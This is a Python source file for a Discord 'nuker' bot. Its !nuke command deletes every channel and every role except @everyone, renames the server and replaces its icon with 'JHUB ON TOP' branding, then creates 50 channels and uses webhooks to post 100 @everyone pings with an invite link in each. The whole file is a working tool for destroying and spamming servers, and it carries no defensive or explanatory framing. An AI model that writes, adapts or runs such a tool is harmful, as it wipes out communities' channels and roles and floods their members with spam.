import discord
from discord.ext import commands
import os
import aiohttp
import asyncio

# Configuration
prefix = "!"
channel_name = "nuked-by-jhub"
webhook_name = "JHUB ON TOP"
webhook_pfp = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b8458d4f1cfb539b5cb03c.gif?size=96"
spam_message = "@everyone JHUB ON TOP  discord.gg/k7dfvnK7KK"
guild_name = "JHUB ON TOP"
guild_icon = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b8458d4f1cfb539b5cb03c.gif?size=96"
channels_to_create = 50
pings_per_channel = 100

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents)

@bot.event
async def on_ready():
    print(f"✅ {bot.user} is online and ready.")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    print("⚠️ Starting NUKE sequence...")

    # Delete all channels
    await asyncio.gather(*(channel.delete() for channel in guild.channels if isinstance(channel, discord.abc.GuildChannel)))

    # Delete all roles except @everyone
    await asyncio.gather(*(role.delete() for role in guild.roles if role.name != "@everyone"))

    # Rename server and change icon
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(guild_icon) as resp:
                if resp.status == 200:
                    icon_data = await resp.read()
                    await guild.edit(name=guild_name, icon=icon_data)
    except Exception as e:
        print(f"❌ Failed to change server name/icon: {e}")

    # Create channels and spam @everyone via webhooks concurrently
    async def create_and_spam(index):
        try:
            channel = await guild.create_text_channel(f"{channel_name}-{index}")
            webhook = await channel.create_webhook(name=webhook_name)
            for _ in range(pings_per_channel):
                try:
                    await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
                except Exception as e:
                    print(f"❌ Webhook send failed in channel {channel.name}: {e}")
        except Exception as e:
            print(f"❌ Failed to create/spam channel {index}: {e}")

    await asyncio.gather(*(create_and_spam(i) for i in range(channels_to_create)))

    print("✅ NUKE complete.")

if __name__ == "__main__":
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        print("❌ Error: DISCORD_TOKEN environment variable not found.")
        exit(1)
    bot.run(token)
